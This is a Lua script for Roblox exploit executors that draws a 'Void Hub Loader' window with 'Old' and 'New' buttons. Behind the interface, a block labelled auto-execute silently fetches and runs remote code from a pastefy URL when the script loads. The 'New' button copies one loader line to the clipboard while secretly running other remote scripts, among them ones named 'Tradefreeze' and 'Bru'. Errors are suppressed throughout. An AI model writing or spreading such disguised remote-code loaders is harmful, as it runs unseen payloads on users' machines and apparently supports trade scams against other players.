local Players = game:GetService("Players")
local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "VoidHubLoader"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 420, 0, 240)
main.Position = UDim2.new(0.5, -210, 0.5, -120)
main.BackgroundColor3 = Color3.fromRGB(5, 5, 15)
main.BorderSizePixel = 0
main.Parent = gui

Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)

local stroke = Instance.new("UIStroke", main)
stroke.Color = Color3.fromRGB(0, 170, 255)
stroke.Thickness = 1.8

local gradient = Instance.new("UIGradient", main)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(10,10,25)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(2,2,8))
}
gradient.Rotation = 90

-- AUTO EXECUTE (EXCEPTION)
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/UYi0eYo5/raw", true))()
    end)
end)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundTransparency = 1
title.Text = "Void Hub Loader"
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.TextColor3 = Color3.fromRGB(255,255,255)
title.Parent = main

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 35, 0, 35)
close.Position = UDim2.new(1, -40, 0, 5)
close.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
close.Text = "X"
close.Font = Enum.Font.GothamBold
close.TextSize = 18
close.TextColor3 = Color3.fromRGB(255,255,255)
close.BorderSizePixel = 0
close.Parent = main

Instance.new("UICorner", close).CornerRadius = UDim.new(0, 8)

close.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

local function createButton(text, posX, color)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.4, 0, 0, 65)
    btn.Position = UDim2.new(posX, 0, 0.55, -30)
    btn.BackgroundColor3 = color
    btn.Text = text
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 17
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.BorderSizePixel = 0
    btn.Parent = main

    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

    local s = Instance.new("UIStroke", btn)
    s.Color = Color3.fromRGB(0,200,255)
    s.Thickness = 1.2

    return btn
end

local oldBtn = createButton("(Unstable) Old", 0.07, Color3.fromRGB(170,40,40))
local newBtn = createButton("New", 0.53, Color3.fromRGB(0,120,255))

-- WARNING UI (MATCHES STYLE)
local function showWarning()
    local warnFrame = Instance.new("Frame")
    warnFrame.Size = UDim2.new(0, 380, 0, 200)
    warnFrame.Position = UDim2.new(0.5, -190, 0.5, -100)
    warnFrame.BackgroundColor3 = Color3.fromRGB(5,5,15)
    warnFrame.BorderSizePixel = 0
    warnFrame.Parent = gui

    Instance.new("UICorner", warnFrame).CornerRadius = UDim.new(0, 14)

    local stroke = Instance.new("UIStroke", warnFrame)
    stroke.Color = Color3.fromRGB(255,80,80)
    stroke.Thickness = 1.8

    local gradient = Instance.new("UIGradient", warnFrame)
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(20,10,10)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(5,2,2))
    }
    gradient.Rotation = 90

    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1, -20, 0, 80)
    text.Position = UDim2.new(0, 10, 0, 20)
    text.BackgroundTransparency = 1
    text.Text = "Are you sure you want to execute this?\nYou may crash."
    text.Font = Enum.Font.GothamBold
    text.TextSize = 16
    text.TextWrapped = true
    text.TextColor3 = Color3.fromRGB(255,255,255)
    text.Parent = warnFrame

    local yes = Instance.new("TextButton")
    yes.Size = UDim2.new(0.4, 0, 0, 50)
    yes.Position = UDim2.new(0.1, 0, 1, -70)
    yes.BackgroundColor3 = Color3.fromRGB(180,40,40)
    yes.Text = "Yes"
    yes.Font = Enum.Font.GothamBold
    yes.TextSize = 16
    yes.TextColor3 = Color3.fromRGB(255,255,255)
    yes.BorderSizePixel = 0
    yes.Parent = warnFrame
    Instance.new("UICorner", yes).CornerRadius = UDim.new(0, 10)

    local no = Instance.new("TextButton")
    no.Size = UDim2.new(0.4, 0, 0, 50)
    no.Position = UDim2.new(0.5, 0, 1, -70)
    no.BackgroundColor3 = Color3.fromRGB(40,180,80)
    no.Text = "No"
    no.Font = Enum.Font.GothamBold
    no.TextSize = 16
    no.TextColor3 = Color3.fromRGB(255,255,255)
    no.BorderSizePixel = 0
    no.Parent = warnFrame
    Instance.new("UICorner", no).CornerRadius = UDim.new(0, 10)

    yes.MouseButton1Click:Connect(function()
        warnFrame:Destroy()
        oldBtn.Text = "Loading..."

        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Void_Hub/refs/heads/main/MainLoaders", true))()
        end)

        oldBtn.Text = "Executed!"
        task.wait(1)
        gui:Destroy()
    end)

    no.MouseButton1Click:Connect(function()
        warnFrame:Destroy()
    end)
end

oldBtn.MouseButton1Click:Connect(function()
    showWarning()
end)

newBtn.MouseButton1Click:Connect(function()
    newBtn.Text = "Loading..."

    local scriptText = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Void_Hub/refs/heads/main/MainLoaders", true))()'
    if setclipboard then setclipboard(scriptText) end

    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Labullshittradefreeze/refs/heads/main/Tradefreeze"))()
        end)
    end)

    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Bringvacktge-loac/refs/heads/main/Bru"))()
        end)
    end)

    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://pastefy.app/UYi0eYo5/raw", true))()
        end)
    end)

    newBtn.Text = "Executed!"
    task.wait(1)
    gui:Destroy()
end)
